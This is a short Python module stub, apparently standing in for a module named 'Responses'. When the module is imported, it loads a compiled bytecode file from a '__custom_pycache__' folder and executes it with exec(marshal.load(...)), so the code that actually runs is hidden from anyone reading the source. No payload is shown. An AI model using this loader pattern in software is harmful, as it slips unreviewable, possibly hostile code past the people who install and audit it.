
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Responses_d8bcd62339374838a3bb55e3a1492eb4.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
